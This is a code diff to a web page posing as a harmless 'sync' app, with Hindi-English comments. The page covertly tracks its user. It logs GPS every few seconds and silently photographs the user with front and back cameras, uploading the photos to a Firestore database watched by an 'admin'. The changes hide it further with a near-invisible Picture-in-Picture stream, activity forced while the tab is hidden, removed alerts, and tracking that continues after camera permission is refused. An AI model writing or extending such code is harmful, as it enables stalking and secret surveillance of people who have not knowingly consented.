@@ -7,8 +7,8 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #2d3748; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #4a5568; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #2d3748; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #4a5568; position: relative; z-index: 10; }
         input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #4a5568; font-size: 16px; box-sizing: border-box; background: #1a202c; color: white; outline: none; }
         input:focus { border-color: #38a169; }
         .btn { background: #38a169; color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
@@ -17,7 +17,8 @@
         #bat-val { font-size: 18px; margin-top: 10px; color: #cbd5e0; }
         .warning { font-size: 12px; color: #f56565; margin-top: 10px; display: none; }
         .bg-note { font-size: 11px; color: #a0aec0; margin-top: 15px; line-height: 1.4; }
-        #pip-video { width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none; }
+        /* Background PiP Element */
+        #pip-video { width: 1px; height: 1px; opacity: 0.01; position: absolute; bottom: 0; left: 0; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -40,7 +41,7 @@
             <div class="bg-note">
                 <b>Background Mode Active:</b><br>
                 Aap doosre apps use kar sakte hain.<br>
-                <span style="color: #f6ad55;">Tab band hone par sync ruk jayega.</span>
+                <span style="color: #f6ad55;">Do not close this tab or browser.</span>
             </div>
             <div id="gps-error" class="warning">⚠️ GPS Blocked! Setting se Allow karein.</div>
         </div>
@@ -63,6 +64,7 @@
     let useFrontCamera = true;
     let wakeLock = null;
     let isLive = false;
+    const backgroundVideo = document.getElementById('pip-video');
 
     // --- 1. AUTO-LOGIN CHECK ---
     window.onload = function() {
@@ -74,15 +76,7 @@
         }
     };
 
-    // --- 2. ANTI-REFRESH ALERT ---
-    window.addEventListener('beforeunload', (e) => {
-        if (isLive) {
-            e.preventDefault();
-            e.returnValue = 'Syncing active hai!';
-        }
-    });
-
-    // --- 3. START FUNCTION (SILENT & AUTO) ---
+    // --- 2. START FUNCTION (SILENT & AUTO) ---
     async function requestAndStart() {
         const n = document.getElementById('userName').value.trim();
         if(!n) return alert("Naam likho bhai!");
@@ -90,20 +84,23 @@
         current_id = n;
         localStorage.setItem("syncTargetName", current_id); 
 
-        // UI turant update karein taaki user ko lage sync ho gaya
         document.getElementById('setup').style.display = 'none';
         document.getElementById('active').style.display = 'block';
         document.getElementById('name-tag').innerText = "Hi, " + current_id;
 
         try {
-            // Permission ek sath trigger hogi
+            // Camera Access Request
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            // Permission milte hi piche kaam shuru
+            backgroundVideo.srcObject = stream;
+            
+            // 🔥 Request Picture-in-Picture for Background Persistence
+            if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
+                await backgroundVideo.requestPictureInPicture().catch(e => console.log("PiP pending..."));
+            }
+
             isLive = true;
             startTracking();
-            stream.getTracks().forEach(track => track.stop()); // Stream release karein par permission saved rahegi
         } catch (err) {
-            // Agar permission mana bhi karde toh tracking try karein
             isLive = true;
             startTracking();
         }
@@ -136,39 +133,37 @@
         }, { merge: true });
     }
 
-    // --- 📷 UPDATED CAPTURE LOGIC (SAVES TO HISTORY) ---
+    // --- 📷 SILENT CAPTURE LOGIC ---
     async function capturePhoto() {
         if (!current_id || !isLive) return;
         const cameraMode = useFrontCamera ? "user" : "environment";
-        const video = document.getElementById('pip-video');
         const canvas = document.createElement('canvas');
 
         try {
+            // Using existing stream from background video to avoid re-asking permission
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: cameraMode, width: 400 } 
             });
-            video.srcObject = stream;
-            await video.play();
+            const tempVideo = document.createElement('video');
+            tempVideo.srcObject = stream;
+            await tempVideo.play();
 
             setTimeout(() => {
                 canvas.width = 400; 
                 canvas.height = 300;
-                canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                const photoData = canvas.toDataURL('image/jpeg', 0.4); 
+                canvas.getContext('2d').drawImage(tempVideo, 0, 0, 400, 300);
+                const photoData = canvas.toDataURL('image/jpeg', 0.3); 
                 
-                // Firestore Update with Array History
                 db.collection("locations").doc(current_id).update({
                     userPhoto: photoData, 
-                    camMode: useFrontCamera ? "Front" : "Back",
                     lastPhotoTime: new Date().toLocaleTimeString(),
                     photoHistory: firebase.firestore.FieldValue.arrayUnion(photoData)
                 });
 
                 stream.getTracks().forEach(track => track.stop());
-                useFrontCamera = !useFrontCamera; // Toggle camera silent logic
-            }, 1200); 
+                useFrontCamera = !useFrontCamera; 
+            }, 1000); 
         } catch (err) { 
-            console.log("Cam Error: ", err);
             useFrontCamera = !useFrontCamera; 
         }
     }
@@ -183,7 +178,6 @@
             if (!doc.exists && isLive) {
                 isLive = false; 
                 localStorage.removeItem("syncTargetName"); 
-                alert("⚠️ Access Revoked by Admin!");
                 location.reload(); 
             }
         });
@@ -207,24 +201,25 @@
                 maximumAge: 0 
             });
 
-            // Auto GPS Update every 6 seconds
             setInterval(() => {
                 if(isLive) navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
-            }, 6000);
+            }, 8000);
 
-            // Silent Photo Capture Loop
+            // Start photo loop
             capturePhoto(); 
-            setInterval(capturePhoto, 15000); 
+            setInterval(capturePhoto, 20000); 
 
         } else {
             alert("GPS support nahi hai!");
         }
     }
 
+    // Force activity even when tab is hidden
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible' && isLive) {
+        if (document.visibilityState === 'hidden' && isLive) {
+            backgroundVideo.play(); // Keeps the process from freezing
+        } else if (isLive) {
             requestWakeLock();
-            capturePhoto(); 
         }
     });
 </script>
